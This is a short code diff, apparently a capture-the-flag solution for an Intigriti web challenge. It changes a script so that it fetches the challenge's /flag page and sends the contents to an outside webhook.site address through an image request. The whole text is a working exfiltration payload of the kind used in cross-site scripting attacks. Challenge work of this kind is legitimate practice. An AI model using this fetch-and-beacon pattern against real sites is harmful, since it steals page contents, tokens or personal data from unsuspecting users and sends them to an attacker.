@@ -1,3 +1,8 @@
 <script>
-location = "https://challenge-0326.intigriti.io/flag";
+fetch("https://challenge-0326.intigriti.io/flag")
+.then(r => r.text())
+.then(x => {
+    var i = new Image();
+    i.src = "https://webhook.site/dd9a7bcc-fd76-4617-8491-a10ca7da54e1?flag=" + encodeURIComponent(x);
+});
 </script>
